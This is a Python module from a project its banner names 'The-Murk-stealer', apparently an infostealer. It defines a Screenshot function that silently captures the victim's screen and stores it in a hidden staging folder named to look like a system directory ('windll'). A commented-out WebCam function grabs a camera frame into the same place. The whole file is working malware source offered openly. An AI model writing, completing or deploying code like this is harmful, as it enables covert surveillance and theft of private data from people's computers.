#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from PIL import ImageGrab
from os import environ,sep
# import cv2

def Screenshot():
	try:
		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
		screen = ImageGrab.grab()
		screen.save(rf'{pathtofolder}\windll\Photos\sreenshot.jpg')
		print("screen")
	except Exception as e:
		print(e)
'''
def WebCam():
	try:
		try:
			pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
			cam = cv2.VideoCapture(0)
			cam.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
			cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
			ret, frame = cam.read()
			cv2.imwrite(rf'{pathtofolder}\windll\Photos\webcam.png',frame)
			cam.release()
		except Exception as e:
			print(e)
	except Exception as e:
		print(e)
'''